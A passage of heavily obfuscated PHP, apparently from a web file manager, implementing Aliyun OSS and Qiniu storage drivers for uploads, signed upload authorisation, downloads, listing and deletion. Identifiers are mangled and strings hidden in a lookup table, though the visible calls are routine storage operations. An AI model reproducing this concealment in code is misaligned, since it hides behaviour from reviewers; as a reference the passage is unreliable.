(!in_array($€ÃŒ¿¡ä, $ñ°Ç‚´õ)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($ÁĞÁ‹©Û), $€ÃŒ¿¡ä); } catch (OSS\Core\OssException $ÛË –İŸ) { return !1; } return !0; } public function getContent($÷“É™¥˜) { return $this->fileSubstr($÷“É™¥˜, -1); } public function setContent($¦¥»Éš­, $Ìíçéû = '') { $Ï„…îü =& $_SERVER[ Ö‘ñÄ”]; try { $‹‚™€íü = $this->trafficLimit($Ï„…îü[1415]); $ŞÆİ¨·— = $this->client->putObject($this->bucket, $this->pathEncode($¦¥»Éš­), $Ìíçéû, $‹‚™€íü); } catch (OSS\Core\OssException $”£ÆåÔı) { return !1; } $¾·©„‰ó = array($Ï„…îü[1405] => trim($ŞÆİ¨·—[$Ï„…îü[1416]], $Ï„…îü[118]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($¦¥»Éš­))); $this->updateObjMeta($¦¥»Éš­, $¾·©„‰ó); return isset($ŞÆİ¨·—[$Ï„…îü[1417]][$Ï„…îü[1364]]) ? !0 : !1; } private function updateObjMeta($‹îË´«Û, $å¥¿‹ö) { $‹îË´«Û = $this->pathEncode($‹îË´«Û); try { $­ê±²® = array(OSS\OssClient::OSS_HEADERS => $å¥¿‹ö); $this->client->copyObject($this->bucket, $‹îË´«Û, $this->bucket, $‹îË´«Û, $­ê±²®); } catch (OSS\Core\OssException $İ„‡¿ıë) { return !1; } return !0; } public function upload($³”€ôöæ, $“ö‡••Ú, $Î«²ŞÀÖ = false, $ƒ­¡±Âæ = REPEAT_REPLACE) { $Îá˜ãß =& $_SERVER[ Ö‘ñÄ”]; $è «ğ£È = trim($³”€ôöæ, $Îá˜ãß[8]); $³à«ê× = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($Îá˜ãß[1405] => @md5_file($“ö‡••Ú)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($³”€ôöæ))); $³à«ê× = $this->trafficLimit($Îá˜ãß[1415], $³à«ê×); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($è «ğ£È), $“ö‡••Ú, $³à«ê×); } catch (OSS\Core\OssException $©äúš‚Ñ) { return !1; } return $this->getPathOuter($³”€ôöæ); } public function getHost() { $ƒàÁ» =& $_SERVER[ Ö‘ñÄ”]; $Ú‰øğÆ¥ = explode($ƒàÁ»[183], parent::getHost()); return $Ú‰øğÆ¥[0] . $ƒàÁ»[183] . $this->bucket . $ƒàÁ»[10] . $Ú‰øğÆ¥[1]; } public function uploadFormData($¿ûÖ…¿, $¤È½ÀÈ¸ = 3600) { $˜•àìÉñ =& $_SERVER[ Ö‘ñÄ”]; if (!($µÛ¾Û“® = $this->getHost())) { return !1; } $«ØÀÎ½ù = $¤È½ÀÈ¸; $ÀŠÁÚ = date($˜•àìÉñ[1418], time() + $«ØÀÎ½ù); $Ò³İéÙ = new DateTime($ÀŠÁÚ); $¶øÛúÆù = $Ò³İéÙ->format(DateTime::ISO8601); $ÜÊ©İºş = strpos($¶øÛúÆù, $˜•àìÉñ[305]); $¶øÛúÆù = substr($¶øÛúÆù, 0, $ÜÊ©İºş) . $˜•àìÉñ[1419]; $‰öÚ‹’™ = 1048576000 * 5; $Òåêõº = $this->pathFather($¿ûÖ…¿); $ïÀÃ­å = array($˜•àìÉñ[1318] => $¶øÛúÆù, $˜•àìÉñ[1319] => array(array($˜•àìÉñ[1420], 0, $‰öÚ‹’™), array($˜•àìÉñ[1322], $˜•àìÉñ[1323], $Òåêõº))); $¿´äï´ş = base64_encode(json_encode($ïÀÃ­å)); $÷–«ì‰± = base64_encode(hash_hmac($˜•àìÉñ[232], $¿´äï´ş, $this->secret, !0)); $­¿Ò……Å = array($˜•àìÉñ[1328] => $¿´äï´ş, $˜•àìÉñ[1421] => $this->accessKey, $˜•àìÉñ[1324] => $˜•àìÉñ[1316], $˜•àìÉñ[1422] => $÷–«ì‰±, $˜•àìÉñ[181] => $µÛ¾Û“®); $­¿Ò……Å = $this->trafficLimit($˜•àìÉñ[1415], $­¿Ò……Å); return $­¿Ò……Å; } public function multiUploadFormData($¢šÌ€¥, $ùÊ€â¿ = 3600) { $æ‘°ÉŞµ =& $_SERVER[ Ö‘ñÄ”]; if (!($’è«Ö˜Ç = $this->getHost())) { return !1; } $ùŠöéıè = $this->trafficLimit($æ‘°ÉŞµ[1415]); $¢„êÆïÕ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($¢šÌ€¥), $ùŠöéıè); return array($æ‘°ÉŞµ[223] => $¢„êÆïÕ, $æ‘°ÉŞµ[181] => $’è«Ö˜Ç . $æ‘°ÉŞµ[8] . $this->pathEncode($¢šÌ€¥), $æ‘°ÉŞµ[224] => gmdate($æ‘°ÉŞµ[1423]), $æ‘°ÉŞµ[94] => $¢šÌ€¥); } public function multiUploadAuthData($é±×§ëØ, $Ë Æ¦¶» = array()) { $ß©¢¶¼Ù =& $_SERVER[ Ö‘ñÄ”]; $Ğå¼Ğßó = isset($Ë Æ¦¶»[$ß©¢¶¼Ù[224]]) ? $Ë Æ¦¶»[$ß©¢¶¼Ù[224]] : gmdate($ß©¢¶¼Ù[1423]); $Î›ª¢•Ö = isset($Ë Æ¦¶»[$ß©¢¶¼Ù[174]]) ? $Ë Æ¦¶»[$ß©¢¶¼Ù[174]] : $ß©¢¶¼Ù[12]; $—ğË¯°û = $é±×§ëØ; if (isset($Ë Æ¦¶»[$ß©¢¶¼Ù[94]])) { $—ğË¯°û = $Ë Æ¦¶»[$ß©¢¶¼Ù[94]]; unset($Ë Æ¦¶»[$ß©¢¶¼Ù[94]]); } if (isset($Ë Æ¦¶»[$ß©¢¶¼Ù[225]])) { $Ë Æ¦¶»[$ß©¢¶¼Ù[224]] = $Ğå¼Ğßó; return $this->listUploadParts($—ğË¯°û, $Ë Æ¦¶»); } $‰ÄìÃ¦ı = array($ß©¢¶¼Ù[226], $ß©¢¶¼Ù[12], $ß©¢¶¼Ù[120], $Ğå¼Ğßó, "\170\x2d\x6f\x73\x73\x2d\144\141\x74\145\72{$Ğå¼Ğßó}", $ß©¢¶¼Ù[8] . $this->bucket . $ß©¢¶¼Ù[8] . $—ğË¯°û . $Î›ª¢•Ö); if (strpos($Î›ª¢•Ö, $ß©¢¶¼Ù[227]) === 0) { $‰ÄìÃ¦ı[0] = $ß©¢¶¼Ù[228]; if ($Œé²ïÌ = $this->trafficLimit($ß©¢¶¼Ù[1415])) { $—ğË¯°û = $ß©¢¶¼Ù[1424]; array_splice($‰ÄìÃ¦ı, 5, 0, $—ğË¯°û . $ß©¢¶¼Ù[4] . $Œé²ïÌ[$—ğË¯°û]); } } if (isset($Ë Æ¦¶»[$ß©¢¶¼Ù[229]]) && $Ë Æ¦¶»[$ß©¢¶¼Ù[229]] == $ß©¢¶¼Ù[230]) { $‰ÄìÃ¦ı[0] = $ß©¢¶¼Ù[230]; } if (!empty($Ë Æ¦¶»[$ß©¢¶¼Ù[1425]])) { $‘çüó‚õ = array_merge(array($‰ÄìÃ¦ı[4]), $Ë Æ¦¶»[$ß©¢¶¼Ù[1425]]); sort($‘çüó‚õ); $‰ÄìÃ¦ı[4] = implode($ß©¢¶¼Ù[231], $‘çüó‚õ); } $ó½Æ = implode($ß©¢¶¼Ù[231], $‰ÄìÃ¦ı); $ƒû«í£ß = base64_encode(hash_hmac($ß©¢¶¼Ù[232], $ó½Æ, $this->secret, !0)); $Œİ”«îç = $ß©¢¶¼Ù[1389] . $this->accessKey . $ß©¢¶¼Ù[4] . $ƒû«í£ß; if (strpos($Î›ª¢•Ö, $ß©¢¶¼Ù[227]) === 0) { $Œİ”«îç = array($ß©¢¶¼Ù[234] => $Œİ”«îç, $ß©¢¶¼Ù[224] => $Ğå¼Ğßó); if ($Œé²ïÌ) { $Œİ”«îç = array_merge($Œİ”«îç, $Œé²ïÌ); } } return $Œİ”«îç; } public function listUploadParts($ÁÅÄ‚¾, $²´©™ïÂ) { $Ò½áˆ¡ =& $_SERVER[ Ö‘ñÄ”]; $«İöîŠ¹ = parse_url_query($²´©™ïÂ[$Ò½áˆ¡[174]]); $ˆÃ•¥± = $this->client->listParts($this->bucket, $this->pathEncode($ÁÅÄ‚¾), $«İöîŠ¹[$Ò½áˆ¡[223]]); $’ıè«ëì = $ˆÃ•¥±->getListPart(); $¨…Óµşš = array(); foreach ($’ıè«ëì as $§”·¾ Ó) { $¨…Óµşš[] = array($Ò½áˆ¡[1409] => $§”·¾ Ó->getPartNumber(), $Ò½áˆ¡[1410] => trim($§”·¾ Ó->getETag(), $Ò½áˆ¡[118])); } unset($²´©™ïÂ[$Ò½áˆ¡[225]], $²´©™ïÂ[$Ò½áˆ¡[229]]); $·ìâƒËû = $this->multiUploadAuthData($ÁÅÄ‚¾, $²´©™ïÂ); if (empty($·ìâƒËû)) { return !1; } return array($Ò½áˆ¡[234] => $·ìâƒËû, $Ò½áˆ¡[224] => $²´©™ïÂ[$Ò½áˆ¡[224]], $Ò½áˆ¡[236] => $¨…Óµşš); } public function download($´‰şóÏÄ, $¨Ñ¹â–) { if ($this->isFolder($´‰şóÏÄ)) { return !1; } try { $ª·™Î­¦ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $¨Ñ¹â–); $ª·™Î­¦ = $this->trafficLimit($_SERVER[ Ö‘ñÄ”][109], $ª·™Î­¦); $this->client->getObject($this->bucket, $this->pathEncode($´‰şóÏÄ), $ª·™Î­¦); } catch (OSS\Core\OssException $åÀ³²§¨) { return !1; } return $¨Ñ¹â–; } public function fileSubstr($‹ê«‹¨¼, $™ÔüÑ¼Á = 0, $ğç¾¨ëò = false) { if ($™ÔüÑ¼Á === -1) { $×—ºİ Ö = array(); } else { if ($ğç¾¨ëò === !1) { $şœÅª‚š = $this->size($‹ê«‹¨¼); } else { $şœÅª‚š = $™ÔüÑ¼Á + $ğç¾¨ëò - 1; } $×—ºİ Ö = array(OSS\OssClient::OSS_RANGE => "{$™ÔüÑ¼Á}\55{$şœÅª‚š}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($‹ê«‹¨¼), $×—ºİ Ö); } catch (OSS\Core\OssException $¸§÷½„¸) { think_exception($¸§÷½„¸->getMessage()); return !1; } } private function trafficLimit($¤¿¥çÔò, $Œ…ˆŒô = array()) { $Â¯™ãüÌ =& $_SERVER[ Ö‘ñÄ”]; if ($¤¿¥çÔò == $Â¯™ãüÌ[1415] && $this->isUploadServer() || $¤¿¥çÔò == $Â¯™ãüÌ[109] && $this->isFileOutServer()) { return $Œ…ˆŒô; } $“ø·ŸÇ = floatval($GLOBALS[$Â¯™ãüÌ[6]][$Â¯™ãüÌ[89]][$Â¯™ãüÌ[107]][$¤¿¥çÔò]) * 1024 * 1024 * 8; if (!$“ø·ŸÇ) { return $Œ…ˆŒô; } $“ø·ŸÇ = $“ø·ŸÇ < 819200 ? 819200 : ($“ø·ŸÇ > 838860800 ? 838860800 : $“ø·ŸÇ); $Œ…ˆŒô[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($“ø·ŸÇ); return $Œ…ˆŒô; } public function link($Ÿ³‡§Ïâ, $ –ª»†Ñ = array()) { $ Ü¾ı =& $_SERVER[ Ö‘ñÄ”]; if (!$this->exist($Ÿ³‡§Ïâ) || $this->isFolder($Ÿ³‡§Ïâ)) { return !1; } try { $ –ª»†Ñ = $this->trafficLimit($ Ü¾ı[109], $ –ª»†Ñ); $¥ÃØ¬€¸ = $this->client->signUrl($this->bucket, $this->pathEncode($Ÿ³‡§Ïâ), 3600 * 12, $ Ü¾ı[230], $ –ª»†Ñ); return $this->getCdnLink($¥ÃØ¬€¸); } catch (OSS\Core\OssException $¬ê¬©ó¬) { return !1; } } public function fileOut($ØÇ§Ã‡ë, $•ªöëÌÛ = false, $ÁÉ€±ß© = false, $—½şØË¡ = '') { $î„×¯ùÍ =& $_SERVER[ Ö‘ñÄ”]; if ($this->isFileOutServer()) { return $this->fileOutServer($ØÇ§Ã‡ë, $•ªöëÌÛ, $ÁÉ€±ß©, $—½şØË¡); } if (!$ÁÉ€±ß©) { $ÁÉ€±ß© = $this->pathThis($ØÇ§Ã‡ë); } $ÁÉ€±ß© = rawurlencode($ÁÉ€±ß©); $Íâ”¹Èğ = get_file_mime(get_path_ext($ÁÉ€±ß©)); if ($Íâ”¹Èğ == $î„×¯ùÍ[217]) { return parent::fileOut($ØÇ§Ã‡ë, $•ªöëÌÛ, $ÁÉ€±ß©, $—½şØË¡); } $•ªöëÌÛ = $•ªöëÌÛ ? $î„×¯ùÍ[1426] : $î„×¯ùÍ[1427]; $ÇÀó¥­Œ = array(OSS\OssClient::OSS_SUB_RESOURCE => $î„×¯ùÍ[1428] . rawurlencode("{$•ªöëÌÛ}\x3b\x66\151\x6c\145\x6e\141\155\x65\x3d{$ÁÉ€±ß©}")); $ÇÀó¥­Œ[OSS\OssClient::OSS_SUB_RESOURCE] .= $î„×¯ùÍ[1429] . rawurlencode($Íâ”¹Èğ); $à­ğ¦â = $this->link($ØÇ§Ã‡ë, $ÇÀó¥­Œ); $this->fileOutLink($à­ğ¦â); } public function fileOutServer($Ú³¿Ã¡Ú, $ ñæç = false, $ïôÅÄùı = false, $ğ…Éƒ³— = '') { parent::fileOut($Ú³¿Ã¡Ú, $ ñæç, $ïôÅÄùı, $ğ…Éƒ³—); } public function fileOutImage($œÁØ¸Ä‡, $âÑÆ¶çâ = 250) { $†ˆø´ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[ Ö‘ñÄ”][1430] . $âÑÆ¶çâ); $Æî¿çØ¦ = $this->link($œÁØ¸Ä‡, $†ˆø´); $this->fileOutLink($Æî¿çØ¦); } public function fileOutImageServer($ï±¢©ìí, $’”—½ã = 250) { parent::fileOutImage($ï±¢©ìí, $’”—½ã); } public function fileOutLink($ÕÊÚû½) { $ßÌË° =& $_SERVER[ Ö‘ñÄ”]; if (!$this->isCdnHost() && substr($ÕÊÚû½, 0, 7) == $ßÌË°[1331]) { $ÕÊÚû½ = $ßÌË°[1332] . substr($ÕÊÚû½, 7); } header($ßÌË°[161] . $ÕÊÚû½); die; } public function hashMd5($………Óø‰, $ĞÎÛì³¾ = '') { $úì›®º =& $_SERVER[ Ö‘ñÄ”]; $Çğóã‚£ = $this->_objectMeta($………Óø‰); if (!$Çğóã‚£) { return $úì›®º[12]; } if (!isset($Çğóã‚£[$úì›®º[1405]]) && !empty($ĞÎÛì³¾)) { $æœ Ê‘İ = $this->updateObjMeta($………Óø‰, array($úì›®º[1405] => $ĞÎÛì³¾)); $Çğóã‚£[$úì›®º[1405]] = $æœ Ê‘İ ? $ĞÎÛì³¾ : $úì›®º[12]; } return isset($Çğóã‚£[$úì›®º[1405]]) ? strtolower($Çğóã‚£[$úì›®º[1405]]) : $úì›®º[12]; } public function size($âÖóÍó ) { $´‡éäïÒ = $this->objectMeta($âÖóÍó ); return $´‡éäïÒ ? $´‡éäïÒ[$_SERVER[ Ö‘ñÄ”][76]] : 0; } public function info($èÌÊåğ–) { if ($this->isFolder($èÌÊåğ–)) { return $this->folderInfo($èÌÊåğ–); } else { if ($this->isFile($èÌÊåğ–)) { return $this->fileInfo($èÌÊåğ–); } } return !1; } public function exist($¢Öşè’‰) { return $this->isFile($¢Öşè’‰) || $this->isFolder($¢Öşè’‰); } public function isFile($œØ³é©Ô) { return !$this->isFolder($œØ³é©Ô) && $this->objectMeta($œØ³é©Ô); } public function isFolder($­Äáàè“) { return $this->cacheMethod($_SERVER[ Ö‘ñÄ”][165], $­Äáàè“); } protected function objectMeta($»”ÄÔ») { return $this->cacheMethod($_SERVER[ Ö‘ñÄ”][167], $»”ÄÔ»); } protected function _objectMeta($‘ì× œê) { $—…¼éİ¨ =& $_SERVER[ Ö‘ñÄ”]; try { $ñÑàß­“ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($‘ì× œê)); } catch (OSS\Core\OssException $¨ğÑş»±) { $ñÑàß­“ = !1; } if ($ñÑàß­“) { $ñÑàß­“[$—…¼éİ¨[76]] = intval($ñÑàß­“[$—…¼éİ¨[1403]]); } return $ñÑàß­“; } protected function _isFolder($òŠ¹íì­) { $ÒóÀ˜‘ä =& $_SERVER[ Ö‘ñÄ”]; if ($òŠ¹íì­ == $ÒóÀ˜‘ä[12] || $òŠ¹íì­ == $ÒóÀ˜‘ä[8]) { return !0; } $üÙ…„¡‚ = array($ÒóÀ˜‘ä[1399] => $ÒóÀ˜‘ä[8], $ÒóÀ˜‘ä[1400] => rtrim($òŠ¹íì­, $ÒóÀ˜‘ä[8]) . $ÒóÀ˜‘ä[8], $ÒóÀ˜‘ä[1401] => 1, $ÒóÀ˜‘ä[1402] => $ÒóÀ˜‘ä[12]); $¥–€€™³ = $this->client->listObjects($this->bucket, $üÙ…„¡‚); if ($¥–€€™³->getObjectList() || $¥–€€™³->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public function __construct($Ï¬Œ÷Œï) { parent::__construct(); require_once SDK_DIR . $_SERVER[ Ö‘ñÄ”][1431]; $this->_init($Ï¬Œ÷Œï); } public function _init($åª“Ôèî) { $Çµü»ãŞ =& $_SERVER[ Ö‘ñÄ”]; foreach ($åª“Ôèî as $é•Ÿğ Ë => $Ÿê±¤Äƒ) { if (isset($this->{$é•Ÿğ Ë})) { $this->{$é•Ÿğ Ë} = $Ÿê±¤Äƒ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Çµü»ãŞ[1432] . LNG($Çµü»ãŞ[1390])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($¯ï¶„°, $Æ“õ ÉÎ = '', $Ä¼îÕõç = REPEAT_RENAME) { if ($this->setContent($¯ï¶„°, $Æ“õ ÉÎ)) { return $this->getPathOuter($¯ï¶„°); } return !1; } public function mkdir($á¡œ”Ã, $ú¹à“ß‘ = REPEAT_SKIP) { $ºùÄİß¶ =& $_SERVER[ Ö‘ñÄ”]; $Ÿó‹ëäæ = trim($á¡œ”Ã, $ºùÄİß¶[8]); if ($this->_isFolder($Ÿó‹ëäæ)) { return $this->getPathOuter($Ÿó‹ëäæ); } $á¡œ”Ã = $Ÿó‹ëäæ . $ºùÄİß¶[8]; $´ö‰¯’Ù = get_path_this($Ÿó‹ëäæ); $É„ïœ» = $á¡œ”Ã . $´ö‰¯’Ù; if (!$this->mkfile($É„ïœ»)) { return !1; } if (!$this->moveFile($É„ïœ», $á¡œ”Ã)) { $this->delFile($É„ïœ»); return !1; } return $this->getPathOuter($Ÿó‹ëäæ); } public function copyFile($¬ßµçòÎ, $š‹ª¤Í¼) { $èŞ—­Ü = $this->bucketManager->copy($this->bucket, $¬ßµçòÎ, $this->bucket, $š‹ª¤Í¼, !0); return $èŞ—­Ü ? !1 : $this->getPathOuter($š‹ª¤Í¼); } public function moveFile($àøÃ³Ûæ, $ı££İ²Ô) { $Îëø…¾µ = $this->bucketManager->move($this->bucket, $àøÃ³Ûæ, $this->bucket, $ı££İ²Ô, !0); return $Îëø…¾µ ? !1 : $this->getPathOuter($ı££İ²Ô); } public function delFile($ú°„¯‡¾) { if (!$this->exist($ú°„¯‡¾)) { return !0; } $õê“ÑçÆ = $this->bucketManager->delete($this->bucket, $ú°„¯‡¾); return $õê“ÑçÆ ? !1 : !0; } public function delFolder($¦¬ÃöØÂ) { $»°Éåø =& $_SERVER[ Ö‘ñÄ”]; if (!$this->exist($¦¬ÃöØÂ)) { return !0; } $this->listItemCache = !1; $¦•‚Ş“ğ = $this->fileList($¦¬ÃöØÂ); $this->listItemCache = !0; $ë«Öõ±Ö = trim($¦¬ÃöØÂ, $»°Éåø[8]) . $»°Éåø[8]; if (!empty($¦¬ÃöØÂ) && $¦¬ÃöØÂ !== $»°Éåø[197] && !in_array($ë«Öõ±Ö, $¦•‚Ş“ğ[$»°Éåø[82]])) { $¦•‚Ş“ğ[$»°Éåø[82]][] = $ë«Öõ±Ö; } $Î¶ƒùª = $this->delByBatch($¦•‚Ş“ğ[$»°Éåø[83]]); if (!$Î¶ƒùª) { return !1; } $Î¶ƒùª = $this->delByBatch($¦•‚Ş“ğ[$»°Éåø[82]]); if (!$Î¶ƒùª) { return !1; } return $this->delFile($ë«Öõ±Ö); } private function delByBatch($€ÃßÎ£•) { foreach (array_chunk($€ÃßÎ£•, 1000) as $Ûıè·‘˜) { $‘ÃæåÉ‹ = $this->bucketManager->buildBatchDelete($this->bucket, $Ûıè·‘˜); list($®û××ˆ¾, $ŠªÏ–ê) = $this->bucketManager->batch($‘ÃæåÉ‹); if ($ŠªÏ–ê) { return !1; } } return !0; } public function rename($½˜ˆÛóë, $Ô´û“Îª) { return $this->renameObject($½˜ˆÛóë, $Ô´û“Îª); } public function fileInfo($Éà áûÎ, $ï«Ñ³¾ = false, $İØ¶²£ = array()) { $¨æÎéÖ =& $_SERVER[ Ö‘ñÄ”]; $™ìáÄ¡Æ = array($¨æÎéÖ[32] => $this->pathThis($Éà áûÎ), $¨æÎéÖ[84] => $this->getPathOuter($¨æÎéÖ[8] . $Éà áûÎ), $¨æÎéÖ[33] => $¨æÎéÖ[199], $¨æÎéÖ[76] => isset($İØ¶²£[$¨æÎéÖ[1433]]) ? $İØ¶²£[$¨æÎéÖ[1433]] : 0, $¨æÎéÖ[174] => $this->ext($Éà áûÎ)); if ($ï«Ñ³¾) { return $™ìáÄ¡Æ; } $™ìáÄ¡Æ[$¨æÎéÖ[200]] = $™ìáÄ¡Æ[$¨æÎéÖ[85]] = 0; $™ìáÄ¡Æ[$¨æÎéÖ[201]] = $™ìáÄ¡Æ[$¨æÎéÖ[202]] = !0; if (empty($İØ¶²£)) { $İØ¶²£ = $this->objectMeta($Éà áûÎ); if (!$İØ¶²£) { return $™ìáÄ¡Æ; } } if (isset($İØ¶²£[$¨æÎéÖ[1434]])) { $™ìáÄ¡Æ[$¨æÎéÖ[85]] = substr($İØ¶²£[$¨æÎéÖ[1434]] . $¨æÎéÖ[12], 0, 10); } if (isset($İØ¶²£[$¨æÎéÖ[1433]])) { $™ìáÄ¡Æ[$¨æÎéÖ[76]] = $İØ¶²£[$¨æÎéÖ[1433]]; } return $™ìáÄ¡Æ; } public function folderInfo($±©–õíî, $÷Ÿ…¿„À = false) { $ìƒÉÄÆÙ =& $_SERVER[ Ö‘ñÄ”]; $ÉĞŠœ = array($ìƒÉÄÆÙ[32] => $this->pathThis($±©–õíî), $ìƒÉÄÆÙ[84] => $this->getPathOuter($ìƒÉÄÆÙ[8] . $±©–õíî), $ìƒÉÄÆÙ[33] => $ìƒÉÄÆÙ[75]); if ($÷Ÿ…¿„À) { return $ÉĞŠœ; } $ÉĞŠœ[$ìƒÉÄÆÙ[200]] = $ÉĞŠœ[$ìƒÉÄÆÙ[85]] = 0; $ÉĞŠœ[$ìƒÉÄÆÙ[201]] = $ÉĞŠœ[$ìƒÉÄÆÙ[202]] = !0; $±©–õíî = rtrim($±©–õíî, $ìƒÉÄÆÙ[8]) . $ìƒÉÄÆÙ[8]; $§×¥¦Ô = $this->objectMeta($±©–õíî); if (isset($§×¥¦Ô[$ìƒÉÄÆÙ[1434]])) { $ÉĞŠœ[$ìƒÉÄÆÙ[85]] = substr($§×¥¦Ô[$ìƒÉÄÆÙ[1434]] . $ìƒÉÄÆÙ[12], 0, 10); } return $ÉĞŠœ; } public function listPath($ª“çÃ¡¢, $¡šá¶½¨ = false) { $Û¼Œš©Ä =& $_SERVER[ Ö‘ñÄ”]; $¥ë¦óæ§ = $this->fileList($ª“çÃ¡¢, $Û¼Œš©Ä[8], !0); foreach ($¥ë¦óæ§[$Û¼Œš©Ä[82]] as $˜€õ¸‚‹ => $ ¹Ú¥•‚) { $¥ë¦óæ§[$Û¼Œš©Ä[82]][$˜€õ¸‚‹] = $this->folderInfo($ ¹Ú¥•‚, $¡šá¶½¨); } foreach ($¥ë¦óæ§[$Û¼Œš©Ä[83]] as $˜€õ¸‚‹ => $ ¹Ú¥•‚) { $¥ë¦óæ§[$Û¼Œš©Ä[83]][$˜€õ¸‚‹] = $this->fileInfo($ ¹Ú¥•‚[$Û¼Œš©Ä[94]], $¡šá¶½¨, $ ¹Ú¥•‚); } return $¥ë¦óæ§; } public function has($¿¸Á››ğ, $Õ•—¦ëÖ = false, $¶Íë’Û‚ = true) { $Ú·‹Ã¯ =& $_SERVER[ Ö‘ñÄ”]; $¿¸Á››ğ = trim($¿¸Á››ğ, $Ú·‹Ã¯[8]); $¼•¹é¢Ó = empty($¿¸Á››ğ) && $¿¸Á››ğ !== $Ú·‹Ã¯[197] ? $Ú·‹Ã¯[12] : $¿¸Á››ğ . $Ú·‹Ã¯[8]; $™İª³«ò = $Ú·‹Ã¯[12]; $Ãø¼±ú = 500; $¸ı×š° = $Ú·‹Ã¯[8]; $ıóı®é« = $›İê””¤ = 0; while (!0) { check_abort(); list($´¡å²“ã, $á¬÷Ó¶) = $this->bucketManager->listFiles($this->bucket, $¼•¹é¢Ó, $™İª³«ò, $Ãø¼±ú, $¸ı×š°); if ($á¬÷Ó¶) { break; } $™İª³«ò = array_key_exists($Ú·‹Ã¯[1402], $´¡å²“ã) ? $™İª³«ò = $´¡å²“ã[$Ú·‹Ã¯[1435]] : $Ú·‹Ã¯[12]; if ($Õ•—¦ëÖ) { if (!empty($´¡å²“ã[$Ú·‹Ã¯[1436]])) { $ıóı®é« += count($´¡å²“ã[$Ú·‹Ã¯[1436]]); } if (!empty($´¡å²“ã[$Ú·‹Ã¯[1437]])) { $›İê””¤ += count($´¡å²“ã[$Ú·‹Ã¯[1437]]); } if ($™İª³«ò === $Ú·‹Ã¯[12]) { break; } continue; } if ($¶Íë’Û‚) { if (!empty($´¡å²“ã[$Ú·‹Ã¯[1436]])) { return !0; } } else { if (!empty($´¡å²“ã[$Ú·‹Ã¯[1437]])) { return !0; } } if ($™İª³«ò === $Ú·‹Ã¯[12]) { break; } } if ($Õ•—¦ëÖ) { return array($Ú·‹Ã¯[207] => $ıóı®é«, $Ú·‹Ã¯[208] => $›İê””¤); } return !1; } public function listAll($¼İ’Ä¡Ñ) { $Œ¿ÙÍëï =& $_SERVER[ Ö‘ñÄ”]; $´Ô“µ‘… = $this->fileList($¼İ’Ä¡Ñ, $Œ¿ÙÍëï[12], !0); $ÍÖæ¢·Ú = array(); foreach ($´Ô“µ‘…[$Œ¿ÙÍëï[83]] as $©±«Ë‚¾) { $ÍÖæ¢·Ú[$©±«Ë‚¾[$Œ¿ÙÍëï[94]]] = $©±«Ë‚¾[$Œ¿ÙÍëï[76]]; } foreach ($´Ô“µ‘…[$Œ¿ÙÍëï[82]] as $©±«Ë‚¾) { if (is_string($©±«Ë‚¾)) { $ÍÖæ¢·Ú[$©±«Ë‚¾] = 0; } } return $this->listAllFiles($¼İ’Ä¡Ñ, array_keys($ÍÖæ¢·Ú), $ÍÖæ¢·Ú); } private function fileList($ã€ ø†±, $«öÔôŒ = '', $©Çãâ©¼ = 0) { $¥µ¯¨€¢ =& $_SERVER[ Ö‘ñÄ”]; $ã€ ø†± = trim($ã€ ø†±, $¥µ¯¨€¢[8]); $è¥ ñ = empty($ã€ ø†±) && $ã€ ø†± !== $¥µ¯¨€¢[197] ? $¥µ¯¨€¢[12] : $ã€ ø†± . $¥µ¯¨€¢[8]; $èŸš ±¦ = $¥µ¯¨€¢[12]; $ŒîÖºıı = 1000; $—Š¼Ã© = $Üú½¶Éê = array(); while (!0) { check_abort(); list($Ş³ıëß¡, $ÖË¡÷Îü) = $this->bucketManager->listFiles($this->bucket, $è¥ ñ, $èŸš ±¦, $ŒîÖºıı, $«öÔôŒ); if ($ÖË¡÷Îü) { break; } $èŸš ±¦ = array_key_exists($¥µ¯¨€¢[1402], $Ş³ıëß¡) ? $èŸš ±¦ = $Ş³ıëß¡[$¥µ¯¨€¢[1435]] : $¥µ¯¨€¢[12]; $¥ÑÛãşÆ = isset($Ş³ıëß¡[$¥µ¯¨€¢[1436]]) ? $Ş³ıëß¡[$¥µ¯¨€¢[1436]] : array(); $×üŠ”¡ = isset($Ş³ıëß¡[$¥µ¯¨€¢[1437]]) ? $Ş³ıëß¡[$¥µ¯¨€¢[1437]] : array(); foreach ($¥ÑÛãşÆ as $…Õ©õßË) { if ($…Õ©õßË[$¥µ¯¨€¢[94]] == $è¥ ñ) { continue; } $Ù¹î±ı = $…Õ©õßË[$¥µ¯¨€¢[94]]; $‰Ş¥³Õ¬ = $…Õ©õßË[$¥µ¯¨€¢[1433]]; $…Õ©õßË[$¥µ¯¨€¢[76]] = $‰Ş¥³Õ¬; $‡ ïóÛ = $‰Ş¥³Õ¬ == 0 && substr($Ù¹î±ı, strlen($Ù¹î±ı) - 1, 1) == $¥µ¯¨€¢[8] ? !0 : !1; $this->cacheMethodInfoSet($Ù¹î±ı, $‡ ïóÛ, $…Õ©õßË); if ($‡ ïóÛ) { $—Š¼Ã©[] = $Ù¹î±ı; continue; } $Üú½¶Éê[] = $©Çãâ©¼ ? $…Õ©õßË : $Ù¹î±ı; } foreach ($×üŠ”¡ as $Ù¹î±ı) { if ($Ù¹î±ı == $è¥ ñ) { continue; } $—Š¼Ã©[] = 